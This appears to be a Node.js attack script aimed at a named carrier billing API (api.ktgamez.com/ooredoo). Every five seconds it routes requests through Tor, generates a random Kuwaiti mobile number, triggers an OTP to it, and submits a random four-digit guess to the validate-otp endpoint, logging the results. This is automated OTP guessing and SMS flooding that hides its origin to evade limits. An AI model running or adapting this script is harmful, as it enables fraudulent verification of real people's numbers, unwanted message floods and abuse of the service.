const axios = require('axios');
const fs = require('fs');
const tor_axios = require('tor-axios');
const moment = require('moment'); // Import the moment library
const apiUrl = 'https://api.ktgamez.com/ooredoo/send-otp';
const numbersFilePath = './new_numbers.json'; // Path to the numbers JSON file
const responseFilePath = './response.json';

function generateRandomMobileNumber() {
    const min = 60000000;
    const max = 69999999;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateRandomOTP() {
    return Math.floor(1000 + Math.random() * 9000).toString();
}

async function makePostRequests() {
    const newMobileNumber = generateRandomMobileNumber().toString();
    const newOtp = generateRandomOTP();
    const dateTime = moment().format('YYYY-MM-DD HH:mm:ss'); // Format date and time using moment

    // Create a new Tor instance for each request
    const tor = tor_axios.torSetup({
        ip: 'localhost',
        port: 9050,
    });

    const responseData = JSON.parse(fs.readFileSync(responseFilePath, 'utf8'));
    let responseArr = {
        mobile: newMobileNumber,
        dateTime: dateTime, // Store formatted date and time
    };

    try {
        const numbersData = JSON.parse(fs.readFileSync(numbersFilePath, 'utf8'));
        console.log(numbersData.length)
        for (const entry of numbersData) {
            if (entry.number === newMobileNumber) {
                console.log('Duplicate number. Generating a new one...');
                return; // Exit the function if duplicate number
            }
        }

        const newNumberEntry = {
            number: newMobileNumber,
            dateTime: dateTime, // Store formatted date and time
        };

        numbersData.push(newNumberEntry);
        fs.writeFileSync(numbersFilePath, JSON.stringify(numbersData), 'utf8');

        // Make the request using the Tor instance
        const response = await tor.post(apiUrl, { mobile: newMobileNumber });
        // console.log(`Response send-otp:`, response.data);
        responseArr["send-otp"] = response.data;

        if (response.data.statusCode === '200') {
            const validateObject = {
                mobile: "965" + newMobileNumber,
                otp: newOtp,
                transId: response.data.body.transId,
            };

            try {
                const response2 = await tor.post('https://api.ktgamez.com/ooredoo/validate-otp', validateObject);
                // console.log(response2.data);
                responseArr["validate-otp"] = response2.data;
            } catch (err) {
                responseArr["validate-otp"] = err.response ? err.response.data : err.message;
                // console.error('Request error: validate-otp', err.response ? err.response.data : err.message);
            }
        }
    } catch (error) {
        responseArr["send-otp"] = error.response ? error.response.data : error.message;
        console.error('Request error:', error.response ? error.response.data : error.message);
    }

    responseData.push(responseArr);
    fs.writeFileSync(responseFilePath, JSON.stringify(responseData), 'utf8');
}

// Run the loop every 10 seconds
setInterval(makePostRequests, 5000); // 5000 milliseconds = 5 seconds
